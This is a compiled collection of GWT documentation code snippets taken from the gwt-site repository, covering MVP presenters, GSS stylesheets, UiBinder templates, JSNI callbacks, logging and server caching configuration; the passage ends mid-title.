GWT\nDESCRIPTION: This code reference indicates the package where Java bindings for the Google AJAX Feed API are implemented. These bindings allow the Feed Reader to interact with the JavaScript API without writing JSNI calls.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/gwt-iphone.md#2025-04-09_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\ncom.google.gwt.ajaxfeed\n```\n\n----------------------------------------\n\nTITLE: Implementing ValueChangeHandler for History in GWT AppController\nDESCRIPTION: This snippet shows how to implement the ValueChangeHandler interface in the AppController class to handle history events. It includes the onValueChange method that will be called when history changes.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\npublic class AppController implements ValueChangeHandler<String> {\n  ...\n  public void onValueChange(ValueChangeEvent<String> event) {\n    String token = event.getValue();\n    ...\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Runtime Substitution in GSS vs CSS in GWT\nDESCRIPTION: Shows how to call Java code from stylesheets. In GSS, the eval() method is used with the Java expression passed as a quoted argument, replacing the @eval rule from CssResource.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideGssVsCss.md#2025-04-09_snippet_1\n\nLANGUAGE: css\nCODE:\n```\n/* CSS */\n@eval myColor com.foo.bar.client.resource.Colors.getColor()\n\n/* GSS */\n@def MY_COLOR eval(\"com.foo.bar.client.resource.Colors.getColor()\");\n\n/* direct usage */\n.red {\n    color: eval(\"com.foo.bar.client.resource.Colors.getColor()\");\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Table with Error Handling in Java\nDESCRIPTION: Method to update the stock table with price data and clear any existing error messages. Includes timestamp update and error message handling.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/JSON.md#2025-04-09_snippet_12\n\nLANGUAGE: java\nCODE:\n```\nprivate void updateTable(JsArray<StockData> prices) {\n  for (int i=0; i < prices.length(); i++) {\n    updateTable(prices.get(i));\n  }\n\n  // Display timestamp showing last refresh.\n  lastUpdatedLabel.setText(\"Last update : \" +\n      DateTimeFormat.getMediumDateTimeFormat().format(new Date()));\n\n  // Clear any errors.\n  errorMsgLabel.setVisible(false);\n}\n```\n\n----------------------------------------\n\nTITLE: Triggering History State in GWT\nDESCRIPTION: The History.fireCurrentHistoryState() method allows applications to handle startup through history state management.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_12\n\nLANGUAGE: Java\nCODE:\n```\nHistory.fireCurrentHistoryState()\n```\n\n----------------------------------------\n\nTITLE: Enhanced Contacts Presenter with Direct Model Access in GWT\nDESCRIPTION: Updated presenter implementation showing direct model data handling without conversion.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_12\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsPresenter implements Presenter,\n    ...\n    private void fetchContactDetails() {\n      rpcService.getContactDetails(new AsyncCallback<ArrayList<ContactDetails>>() {\n        public void onSuccess(ArrayList<ContactDetails> result) {\n            contactDetails = result;\n            sortContactDetails();\n            view.setRowData(contactDetails);\n        }\n        ...\n      });\n    }\n    ...\n  }\n```\n\n----------------------------------------\n\nTITLE: Example Permutation Selection Event in Lightweight Metrics\nDESCRIPTION: Example of a specific metrics event captured during the GWT startup process, specifically during the permutation selection phase of the bootstrap process.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideLightweightMetrics.md#2025-04-09_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n{ \n  moduleName : 'Showcase',\n  subSystem : 'startup',\n  evtGroup : 'bootstrap',\n  millis : new Date().getTime();\n  type : 'selectingPermutation'\n}\n```\n\n----------------------------------------\n\nTITLE: Configuration Property XML Definition for GSS Conditionals\nDESCRIPTION: XML configuration showing how to define boolean configuration properties for use in GSS conditionals. Properties must be single-valued with true or false values.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideGssVsCss.md#2025-04-09_snippet_4\n\nLANGUAGE: xml\nCODE:\n```\n<set-configuration-property name=\"MY_CONFIGURATION_PROPERTY\" is-multi-valued=\"false\" />\n\n<set-configuration-property name=\"MY_CONFIGURATION_PROPERTY\" value=\"true\" />\n```\n\n----------------------------------------\n\nTITLE: UIObject Style Management Method\nDESCRIPTION: The setStyleName() method for managing CSS style names on UI objects. Changes to its semantics in version 1.4.10 were reverted to maintain backward compatibility.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_16\n\nLANGUAGE: java\nCODE:\n```\nUIObject.setStyleName()\n```\n\n----------------------------------------\n\nTITLE: Data Resource References in GSS vs CSS\nDESCRIPTION: Demonstrates how to reference data resources from ClientBundle in GSS using the resourceUrl() function, which generates URL references based on DataResource.getUrl().\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideGssVsCss.md#2025-04-09_snippet_11\n\nLANGUAGE: css\nCODE:\n```\n/* CSS */\n@url BACKGROUND_IMAGE myImageName\n\n/* GSS */\n@def BACKGROUND_IMAGE resourceUrl(\"myImageName\");\n```\n\n----------------------------------------\n\nTITLE: Fixing Change Percentage Calculation in GWT Stock Price Class\nDESCRIPTION: Corrected Java method to calculate the change percentage in stock price. The bug is fixed by multiplying by 100 instead of 10.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/debug.md#2025-04-09_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\npublic double getChangePercent() {\n  return 100.0 * this.change / this.price;\n}\n```\n\n----------------------------------------\n\nTITLE: Shared Scopes in CssResource\nDESCRIPTION: Shows how to use @Shared annotation to allow certain String accessor functions to return the same value regardless of the CssResource type, which is useful for stateful CSS classes like 'focused' or 'enabled'.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_35\n\nLANGUAGE: java\nCODE:\n```\n@Shared\ninterface FocusCss extends CssResource {\n  String focused();\n  String unfocused();\n}\n\ninterface A extends FocusCss {\n  String widget();\n}\n\ninterface B extends FocusCss {\n  String widget();\n}\n\ninterface C extends B {\n  // Intentionally empty\n}\n\ninterface Resources {\n  A a();\n  B b();\n  C c();\n  FocusCss f();\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing Tree Widget with ARIA Roles in GWT\nDESCRIPTION: Sets up ARIA tree role and creates a focusable element within a GWT Tree widget constructor. Creates a hidden focusable element and applies ARIA tree role for accessibility.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideA11y.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\n// Called from Tree(...) constructor\n  private void init(TreeImages images, boolean useLeafImages) {\n\n    ...\n\n    // Root element of Tree is a div\n    setElement(DOM.createDiv());\n\n    ...\n\n    // Create naturally-focusable element\n    focusable = FocusPanel.impl.createFocusable();\n\n    ...\n\n    // Hide element and append it to root div\n    DOM.setIntStyleAttribute(focusable, \"zIndex\", -1);\n    DOM.appendChild(getElement(), focusable);\n\n    // Listen for key events on the root element\n    sinkEvents(Event.MOUSEEVENTS | Event.ONCLICK | Event.KEYEVENTS);\n\n    ...\n\n    // Add a11y role \"tree\" to the focusable element\n    Roles.getTreeRole().set(focusable);\n }\n```\n\n----------------------------------------\n\nTITLE: Original HTML with Runtime Computed Values\nDESCRIPTION: Basic HTML structure showing spans with ui:field attributes that will be modified at runtime via Java code.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_5\n\nLANGUAGE: html\nCODE:\n```\n<!-- Java code will make calls like getClosingDate().setInnerText(closingDate()) -->\n(closed <span ui:field=\"closingDate\" /> through <span ui:field=\"reopeningDate\"/>)\n```\n\n----------------------------------------\n\nTITLE: Accessing Root Panels in GWT\nDESCRIPTION: Examples of how to access the Root panel in GWT, either by wrapping the body element (default) or by targeting a specific element with an ID.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/buildui.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nRootPanel.get()             // Default. Wraps the HTML body element.\nRootPanel.get(\"stockList\")  // Wraps any HTML element with an id of \"stockList\"\n```\n\n----------------------------------------\n\nTITLE: Logger Operations in GWT: Setting Level, Logging Messages, and Exceptions\nDESCRIPTION: Shows how to set the logging level, log messages, and log exceptions using a GWT logger.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideLogging.md#2025-04-09_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\nvoid handleLevelClick(ChangeEvent e) {\n  Level level = Level.parse(levelTextBox.getItemText(\n      levelTextBox.getSelectedIndex()));\n  logger.log(Level.SEVERE,\n      \"Setting level to: \" + level.getName());\n  logger.setLevel(level);\n}\n\nvoid handleLogClick(ClickEvent e) {\n  Level level = Level.parse(logTextBox.getItemText(\n      logTextBox.getSelectedIndex()));\n  logger.log(level, \"This is a client log message\");\n}\n\nvoid handleExceptionClick(ClickEvent e) {\n  try {\n    Level n = null;\n    n.getName();\n  } catch (NullPointerException ex) {\n    logger.log(Level.SEVERE, \"Null Exception Hit\", ex);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Updating GWT Module Inclusion in HTML\nDESCRIPTION: Simplified method for including GWT modules in HTML pages, replacing the previous meta tag and script approach with a single script element.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_18\n\nLANGUAGE: HTML\nCODE:\n```\n<!-- Old method -->\n<meta name='gwt:module' content='ModuleName'>\n<script src='gwt.js'></script>\n\n<!-- New method -->\n<script src='ModuleName.nocache.js'></script>\n```\n\n----------------------------------------\n\nTITLE: Invalid Runtime Constant Initialization in GSS\nDESCRIPTION: Example of code that will not compile: attempting to initialize a constant within a runtime conditional block, which is not supported in GSS.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideGssVsCss.md#2025-04-09_snippet_8\n\nLANGUAGE: css\nCODE:\n```\n@if (eval(\"com.module.Foo.staticBooleanFunction()\")) {\n  @def FOO 5px;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Apache Server for GWT Perfect Caching\nDESCRIPTION: Apache .htaccess configuration to implement perfect caching for GWT applications. Sets cache control headers for nocache and cache files using mod_expires and mod_headers.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCompilingAndDebugging.md#2025-04-09_snippet_8\n\nLANGUAGE: xml\nCODE:\n```\n<Files *.nocache.*>\n  ExpiresActive on\n  ExpiresDefault \"now\"\n  Header merge Cache-Control \"public, max-age=0, must-revalidate\"\n</Files>\n\n<Files *.cache.*>\n  ExpiresActive on\n  ExpiresDefault \"now plus 1 year\"\n</Files>\n```\n\n----------------------------------------\n\nTITLE: Adding HTML Entity Support to UiBinder Templates\nDESCRIPTION: Shows how to configure a UiBinder template with a DOCTYPE declaration to support HTML entities in XML files.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_8\n\nLANGUAGE: html\nCODE:\n```\n<!DOCTYPE ui:UiBinder SYSTEM \"http://dl.google.com/gwt/DTD/xhtml.ent\">\n```\n\n----------------------------------------\n\nTITLE: Modifying Timer API in Java\nDESCRIPTION: Changes the Timer API to use int instead of long for time values, improving compatibility and performance.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/release-notes.md#2025-04-09_snippet_27\n\nLANGUAGE: Java\nCODE:\n```\nTimer timer = new Timer() {\n  @Override\n  public void run() {\n    // Timer logic\n  }\n};\ntimer.schedule(1000); // Now using int instead of long\n```\n\n----------------------------------------\n\nTITLE: Using Default Decimal Format in GWT\nDESCRIPTION: Example of retrieving and using the default decimal format in GWT to format a double value into a locale-appropriate string representation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsFormatting.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nNumberFormat fmt = NumberFormat.getDecimalFormat();\ndouble value = 12345.6789;\nString formatted = fmt.format(value);\n// Prints 1,2345.6789 in the default locale\nGWT.log(\"Formatted string is\" + formatted, null);\n```\n\n----------------------------------------\n\nTITLE: Invalid Constant as Condition in GSS\nDESCRIPTION: Example of unsupported code: attempting to use a constant as a condition in a conditional block, which is not supported in GSS.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideGssVsCss.md#2025-04-09_snippet_9\n\nLANGUAGE: css\nCODE:\n```\n@def MY_BOOLEAN eval(\"com.module.Foo.staticBooleanFunction()\");\n\n@if (MY_BOOLEAN) {\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Asynchronous Contact Deletion in GWT\nDESCRIPTION: Example of making an asynchronous RPC call to delete contacts using GWT's AsyncCallback pattern. Shows how to collect selected contact IDs and handle the deletion response.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_18\n\nLANGUAGE: java\nCODE:\n```\nArrayList<String> ids = new ArrayList<String>();\n\nfor (int i = 0; i < selectedContacts.size(); ++i) {\n  ids.add(selectedContacts.get(i).getId());\n}\n\nrpcService.deleteContacts(ids, new AsyncCallback<ArrayList<ContactDetails>>() {\n  public void onSuccess(ArrayList<ContactDetails> result) {\n     ...\n  }\n  ...\n});\n```\n\n----------------------------------------\n\nTITLE: Closing Navigation Drawer in GWT\nDESCRIPTION: Helper method to close the drawer panel conditionally based on whether it's in narrow mode.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-applogic.md#2025-04-09_snippet_10\n\nLANGUAGE: Java\nCODE:\n```\n       private void closeMenu() {\n         if (drawerPanel.getNarrow()) {\n             drawerPanel.closeDrawer();\n         }\n       }\n```\n\n----------------------------------------\n\nTITLE: Java Method as JavaScript Callback\nDESCRIPTION: Illustrates how to pass Java methods as callback functions to JavaScript APIs using JSNI. Shows both direct method reference and wrapper function approaches.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/FAQ_Client.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npackage p;\n\nclass C {\n  void doCallback(String callbackData) { ..... }\n  native void invokeExternal(String data) /*-{\n    $wnd.externalJsFunction(data, @p.C::doCallback(Ljava/lang/String;));\n  }-*/;\n}\n```\n\nLANGUAGE: java\nCODE:\n```\npackage p;\n\nclass D {\n  void someCallback(int param1, int param2, String param3) { ..... }\n  native void invokeExternal(String data) /*-{\n    $wnd.externalJsFunction(data, function(int1, int2, string3) {\n      @p.D::someCallback(IILjava/lang/String;)(int1, int2, string3);\n    });\n  }-*/\n}\n```\n\n----------------------------------------\n\nTITLE: Running GWT Documentation Site Locally with Maven\nDESCRIPTION: Command for running the GWT documentation site locally using Maven's Jetty plugin for testing purposes.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/README.md#2025-04-09_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nmvn jetty:run\n```\n\n----------------------------------------\n\nTITLE: Sample XML Document for Email Message\nDESCRIPTION: Example XML structure representing an email message with header and body information.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsXML.md#2025-04-09_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" ?>\n<message>\n  <header>\n    <to displayName=\"Richard\" address=\"rick@school.edu\" />\n    <from displayName=\"Joyce\" address=\"joyce@website.com\" />\n    <sent>2007-05-12T12:03:55Z</sent>\n    <subject>Re: Flight info</subject>\n  </header>\n  <body>I'll pick you up at the airport at 8:30.  See you then!</body>\n</message>\n```\n\n----------------------------------------\n\nTITLE: Inheriting a GWT Module in XML\nDESCRIPTION: Example of how to inherit another GWT module (in this case, the Google Gears API) in a module XML file. This is typically used when incorporating external libraries or reusable code.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideOrganizingProjects.md#2025-04-09_snippet_5\n\nLANGUAGE: XML\nCODE:\n```\n<module>\n...\n    <inherits name='com.google.gwt.gears.Gears' />\n```\n\n----------------------------------------\n\nTITLE: Running GWT Code Server in IntelliJ Maven Configuration\nDESCRIPTION: Maven command for running the GWT code server in IntelliJ's run configuration. This command starts the code server for development mode.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/usingintellij.md#2025-04-09_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngwt:codeserver -pl mywebapp-client -am\n```\n\n----------------------------------------\n\nTITLE: Generic Column Definition Class in GWT\nDESCRIPTION: Abstract class defining the structure for column rendering and behavior configuration.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\npublic abstract class ColumnDefinition<T> {\n    public abstract Widget render(T t);\n\n    public boolean isClickable() {\n      return false;\n    }\n\n    public boolean isSelectable() {\n      return false;\n    }\n  }\n```\n\n----------------------------------------\n\nTITLE: Implementing LoginServiceImpl for User Authentication (Java)\nDESCRIPTION: Server-side implementation of the LoginService, handling user authentication using App Engine's UserService.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_14\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.server;\n\nimport com.google.appengine.api.users.User;\nimport com.google.appengine.api.users.UserService;\nimport com.google.appengine.api.users.UserServiceFactory;\nimport com.google.gwt.sample.stockwatcher.client.LoginInfo;\nimport com.google.gwt.sample.stockwatcher.client.LoginService;\nimport com.google.gwt.user.server.rpc.RemoteServiceServlet;\n\npublic class LoginServiceImpl extends RemoteServiceServlet implements\n    LoginService {\n\n  public LoginInfo login(String requestUri) {\n    UserService userService = UserServiceFactory.getUserService();\n    User user = userService.getCurrentUser();\n    LoginInfo loginInfo = new LoginInfo();\n\n    if (user != null) {\n      loginInfo.setLoggedIn(true);\n      loginInfo.setEmailAddress(user.getEmail());\n      loginInfo.setNickname(user.getNickname());\n      loginInfo.setLogoutUrl(userService.createLogoutURL(requestUri));\n    } else {\n      loginInfo.setLoggedIn(false);\n      loginInfo.setLoginUrl(userService.createLoginURL(requestUri));\n    }\n    return loginInfo;\n  }\n\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Java Utility for Logging Custom Events\nDESCRIPTION: Implementation of a StatsEventLogger utility class in Java that provides a native method to call the __gwtStatsEvent() function from GWT code, allowing custom event logging.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideLightweightMetrics.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npublic class StatsEventLogger {\n  public static native void logEvent(String moduleName, String subSystem,\n      String eventGroup, double millis, String type) /*-{\n    $wnd.__gwtStatsEvent({\n      'moduleName' : moduleName,\n      'subSystem' : subSystem,\n      'evtGroup' : eventGroup,\n      'millis' : millis,\n      'type' : type\n    });\n  }-*/;\n}\n```\n\n----------------------------------------\n\nTITLE: Delete Operation Implementation in GWT Presenter\nDESCRIPTION: Presenter implementation showing how selected items are accessed for deletion.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_17\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsPresenter implements Presenter,\n    ...\n\n    public void onDeleteButtonClicked() {\n      deleteSelectedContacts();\n    }\n\n    private void deleteSelectedContacts() {\n      List<ContactDetails> selectedContacts = selectionModel.getSelectedItems();\n\n```\n\n----------------------------------------\n\nTITLE: Tagged HTML with ui:msg for Internationalization\nDESCRIPTION: The original HTML wrapped in a ui:msg element to enable translation, with a description attribute providing context.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_6\n\nLANGUAGE: xml\nCODE:\n```\n<ui:msg description='closed for business message'>\n  (closed <span ui:field='closingDate' /> through <span ui:field='reopeningDate'/>)\n</ui:msg>\n```\n\n----------------------------------------\n\nTITLE: Loading Polymer Icon Collections with Callback\nDESCRIPTION: Enhances the entry point to load the Polymer iron-icons collection before starting the application. Uses Polymer.importHref with a callback function to ensure icons are available before UI rendering.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/polymer-tutorial/widgets-buildui.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\npackage org.gwtproject.tutorial;\n\nimport com.google.gwt.core.client.EntryPoint;\nimport com.google.gwt.user.client.ui.RootPanel;\nimport com.vaadin.polymer.Polymer;\nimport com.vaadin.polymer.elemental.Function;\n\npublic class TodoList implements EntryPoint {\n\n  public void onModuleLoad() {\n    // We have to load icon sets before run application\n    Polymer.importHref(\"iron-icons/iron-icons.html\", new Function() {\n        public Object call(Object arg) {\n            // The app is executed when all imports succeed.\n            startApplication();\n            return null;\n        }\n    });\n  }\n\n  private void startApplication() {\n    RootPanel.get().add(new Main());\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Click Handler for Add Contact in GWT ContactsPresenter\nDESCRIPTION: This snippet shows how to implement a click handler for the 'Add Contact' button in the ContactsPresenter. It fires an AddContactEvent when the button is clicked.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture.md#2025-04-09_snippet_12\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsPresenter implements Presenter {\n  ...\n  public void bind() {\n    display.getAddButton().addClickHandler(new ClickHandler() {\n      public void onClick(ClickEvent event) {\n        eventBus.fireEvent(new AddContactEvent());\n      }\n    });\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Referencing External CSS Files in UiBinder Templates\nDESCRIPTION: Shows how to reference external CSS files in a UiBinder template instead of defining styles inline, using relative paths from the UI XML file.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_20\n\nLANGUAGE: xml\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'>\n  <ui:style src=\"MyUi.css\" />\n  <ui:style field='otherStyle' src=\"MyUiOtherStyle.css\">\n\n  <div class='{style.pretty}'>\n    Hello, <span class='{otherStyle.pretty}' ui:field='nameSpan'/>.\n  </div>\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: i18nCreator Usage Syntax\nDESCRIPTION: Command line syntax and parameters for the i18nCreator internationalization tool\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefCommandLineTools.md#2025-04-09_snippet_5\n\nLANGUAGE: text\nCODE:\n```\ni18nCreator [-eclipse projectName] [-out dir] [-[no]overwriteFiles] \\\n            [-[no]createConstantsWithLookup] [-[no]createMessages] \\\n            [-[no]ignoreExistingFiles] interfaceName\n```\n\n----------------------------------------\n\nTITLE: Configuring Deferred Binding in GWT Focus Module\nDESCRIPTION: Example module XML file showing deferred binding configuration for browser-specific focus implementations in GWT. It demonstrates how to specify different implementations for various browsers using replace-with rules.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideOrganizingProjects.md#2025-04-09_snippet_8\n\nLANGUAGE: xml\nCODE:\n```\n<module>\n  <inherits name=\"com.google.gwt.core.Core\" />\n  <inherits name=\"com.google.gwt.user.UserAgent\" />\n\n  <!-- old Mozilla, and Opera need a different implementation -->\n  <replace-with class=\"com.google.gwt.user.client.ui.impl.FocusImplOld\">\n    <when-type-is class=\"com.google.gwt.user.client.ui.impl.FocusImpl\" />\n      <any>\n        <when-property-is name=\"user.agent\" value=\"gecko\" />\n        <when-property-is name=\"user.agent\" value=\"opera\" />\n      </any>\n  </replace-with>\n\n  <!--  Safari needs a different hidden input -->\n  <replace-with class=\"com.google.gwt.user.client.ui.impl.FocusImplSafari\">\n    <when-type-is class=\"com.google.gwt.user.client.ui.impl.FocusImpl\" />\n    <when-property-is name=\"user.agent\" value=\"safari\" />\n  </replace-with>\n\n  <!-- IE's implementation traps exceptions on invalid setFocus() -->\n  <replace-with class=\"com.google.gwt.user.client.ui.impl.FocusImplIE6\">\n  <when-type-is class=\"com.google.gwt.user.client.ui.impl.FocusImpl\" />\n    <any>\n      <when-property-is name=\"user.agent\" value=\"ie6\" />\n    </any>\n  </replace-with>\n</module>\n```\n\n----------------------------------------\n\nTITLE: Configuring Super-Source Path in GWT Module XML\nDESCRIPTION: Demonstrates how to configure a super-source path to override package implementations. Used for cases where existing Java APIs need to be re-used but original source is unavailable or untranslatable.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideOrganizingProjects.md#2025-04-09_snippet_6\n\nLANGUAGE: xml\nCODE:\n```\n<super-source path=\"jre\" />\n```\n\n----------------------------------------\n\nTITLE: Annotating JSNI Method for Unsafe Long Usage in GWT\nDESCRIPTION: This snippet shows how to use the UnsafeNativeLong annotation to allow passing long types into and out of JavaScript in GWT. This is considered unsafe and should only be used when absolutely necessary.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJSNI.md#2025-04-09_snippet_8\n\nLANGUAGE: Java\nCODE:\n```\n@com.google.gwt.core.client.UnsafeNativeLong\n```\n\n----------------------------------------\n\nTITLE: SetPresenter Method for ContactsView\nDESCRIPTION: Method that allows the ContactsView to store a reference to its Presenter, enabling callback communication from View to Presenter.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nprivate Presenter<T> presenter;\n  public void setPresenter(Presenter<T> presenter) {\n    this.presenter = presenter;\n  }\n```\n\n----------------------------------------\n\nTITLE: Protecting Parts of Messages from Translation\nDESCRIPTION: This snippet shows how to use ui:ph attribute and element to protect certain parts of a message from being translated, such as CSS classes or trademark symbols.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_3\n\nLANGUAGE: XML\nCODE:\n```\n<div>\n  <ui:msg description=\"blurb\"><span class=\"brand\" ui:ph=\"brandedSpan\">Colgate</span>,\n  with MFP!<ui:ph name=\"trademark\"><span class=\"tm\">TM</span></ui:ph></ui:msg>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Implementing Event Handler Registration in GWT AppController\nDESCRIPTION: Shows how to register an EditContactEventHandler in the AppController to handle EditContactEvents. The handler extracts the contact ID and calls doEditContact() when the event is fired.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\npublic class AppController implements ValueChangeHandler {\n  ...\n  eventBus.addHandler(EditContactEvent.TYPE,\n      new EditContactEventHandler() {\n        public void onEditContact(EditContactEvent event) {\n          doEditContact(event.getId());\n        }\n      });\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Stream Interface Methods Reference\nDESCRIPTION: Core methods available in the Stream interface for creating and manipulating streams of objects.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/RefJreEmulation.md#2025-04-09_snippet_21\n\nLANGUAGE: java\nCODE:\n```\nbuilder(), concat(Stream, Stream), empty(), generate(Supplier), \niterate(T, UnaryOperator), iterate(T, Predicate, UnaryOperator), \nof(T), of(T[]), ofNullable(T), allMatch(Predicate)\n```\n\n----------------------------------------\n\nTITLE: Implementing IsEditor Example with LabelDecorator\nDESCRIPTION: Demonstrates how to implement the IsEditor interface in a LabelDecorator class to reuse a Label's existing Editor behavior. The example shows a composite widget that delegates editor functionality to a wrapped Label component.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiEditors.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nclass LabelDecorator extends Composite implements IsEditor<LeafValueEditor<String>> {\n  private final Label wrapped = new Label();\n \n  public LabelDecorator() {\n    // Construct a pretty UI around the wrapped label\n    initWidget(prettyContents);\n  }\n \n  public LeafValueEditor<String> asEditor() {\n    return wrapped.asEditor();\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Importing GWT Timer Class\nDESCRIPTION: Import declaration for the GWT Timer class which is used to implement automatic refreshing of stock data at regular intervals.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/codeclient.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\nimport com.google.gwt.user.client.Timer;\n```\n\n----------------------------------------\n\nTITLE: Adding UiConstructor Annotation for Widget Constructor Arguments\nDESCRIPTION: Shows how to add a @UiConstructor annotation to a widget constructor to enable passing arguments from UiBinder template attributes.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_15\n\nLANGUAGE: java\nCODE:\n```\npublic @UiConstructor CricketScores(String teamNames) {\n  this(teamNames.split(\"[, ]+\"));\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Record Domain Object in 